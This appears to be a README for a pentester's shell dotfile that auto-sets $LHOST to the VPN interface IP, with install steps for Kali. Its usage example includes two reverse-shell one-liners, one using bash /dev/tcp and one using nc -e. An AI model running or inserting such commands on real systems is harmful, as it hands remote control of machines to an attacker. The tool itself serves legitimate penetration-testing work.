# shell dotfiles

## `lhost.sh` — auto `$LHOST` from the VPN

Keeps `$LHOST` set to your VPN (tun0) IP so reverse-shell one-liners never need a hardcoded
address:

```bash
bash -i >& /dev/tcp/$LHOST/443 0>&1
nc $LHOST 443 -e /bin/sh
```

It **refreshes every prompt**, so it's correct even though the VPN usually connects *after* the
shell opened, and it updates if you reconnect to a different VPN. Also defines an `lhost` command
to print the IP on demand.

### Install (Kali)

```bash
mkdir -p ~/.config/pentest
cp lhost.sh ~/.config/pentest/lhost.sh

# add to ~/.bashrc and/or ~/.zshrc:
echo 'source ~/.config/pentest/lhost.sh' >> ~/.bashrc
echo 'source ~/.config/pentest/lhost.sh' >> ~/.zshrc
```

Open a new shell (or `source` the file). Works in bash and zsh, including every tmux pane since each
pane runs your shell rc.

### Behaviour / notes

- Interface order: `$VPN_IF` (if set) → `tun0` → `tun1` → first other `tun*`/`tap*` that's up.
  Override with `export VPN_IF=tun1`.
- VPN down / no tun interface → `$LHOST` is **unset** (not left stale) and `lhost` exits non-zero.
- Pairs with the reverse-shell section in [`../../Methodology/Linux.md`](../../Methodology/Linux.md)
  (set `LPORT` yourself; `LHOST` is handled) and the `box()` layout helper in `../tmux`.
